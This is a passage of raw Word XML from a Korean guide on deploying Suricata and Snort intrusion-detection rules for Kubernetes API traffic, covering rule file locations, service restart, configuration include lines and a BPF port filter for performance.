      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시도</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>탐지</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6FBFE8" w14:textId="5DAC5EF0" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6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b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>. 실제 환경 적용 가이드</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253CE529" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>규칙 배포 방법</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492E0345" w14:textId="4B48A89F" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Suricata</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>suricata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/rules/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일에</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>규칙</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>추가</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>후</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서비스</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>재시작</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3D79C736" wp14:editId="7C7A6E02">
                <wp:extent cx="4242391" cy="680484"/>
                <wp:effectExtent l="0" t="0" r="25400" b="24765"/>
                <wp:docPr id="173951079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391" cy="680484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4B366" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pPr>
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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484D84">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="20E34E89" w14:textId="73F1354A" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pP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</w:pPr>
                            <w:proofErr w:type="spellStart"/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sudo</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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systemctl</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 restart </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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suricata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79C736" id="_x0000_s1049" style="width:334.05pt;height:5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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="7F84B366" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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</w:pPr>
                      <w:r w:rsidRPr="00484D84">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="20E34E89" w14:textId="73F1354A" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/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sudo</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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systemctl</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 restart </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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suricata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14:paraId="70BABC73" w14:textId="4C6BC218" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Snort</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/snort/rules/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>규칙</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>추가</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>후</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>포함</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D02006A" wp14:editId="30D6B95A">
                <wp:extent cx="4242391" cy="680484"/>
                <wp:effectExtent l="0" t="0" r="25400" b="24765"/>
                <wp:docPr id="2014903994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391" cy="680484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BDD73" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pPr>
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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484D84">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="41BB6057" w14:textId="21099E2C" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pP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</w:pPr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include </w:t>
                            </w:r>
                            <w:r w:rsidRPr="006E05D4">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                                <w:color w:val="FF0000"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>$RULE_PATH</w:t>
                            </w:r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/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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local.rules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02006A" id="_x0000_s1050" style="width:334.05pt;height:5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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="658BDD73" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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</w:pPr>
                      <w:r w:rsidRPr="00484D84">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="41BB6057" w14:textId="21099E2C" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr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include </w:t>
                      </w:r>
                      <w:r w:rsidRPr="006E05D4">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:color w:val="FF0000"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>$RULE_PATH</w:t>
                      </w:r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/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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local.rules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14:paraId="06541C42" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FF081E1" w14:textId="344997DF" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>성능 최적화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B36297" w14:textId="5B14A089" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>BPF 필터 적용</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Kubernetes API 서버 트래픽만 필터링하여 성능 부하 감소</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="415F9AB6" wp14:editId="0BBF0406">
                <wp:extent cx="4242391" cy="680484"/>
                <wp:effectExtent l="0" t="0" r="25400" b="24765"/>
                <wp:docPr id="166154249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391" cy="680484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5EA41" w14:textId="5B66FFF4" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5328B0D4" w14:textId="609D41F5" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                            <w:pP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</w:pPr>
                            <w:proofErr w:type="spellStart"/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suricata</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 -</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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i</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 eth0 -F "port 6443 or port 443"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5F9AB6" id="_x0000_s1051" style="width:334.05pt;height:5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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="76F5EA41" w14:textId="5B66FFF4" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5328B0D4" w14:textId="609D41F5" w:rsidR="006E05D4" w:rsidRPr="00484D84" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/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suricata</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 -</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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i</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 eth0 -F "port 6443 or port 443"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45BE40D" w14:textId="6BCEB709" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>멀티스레딩</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
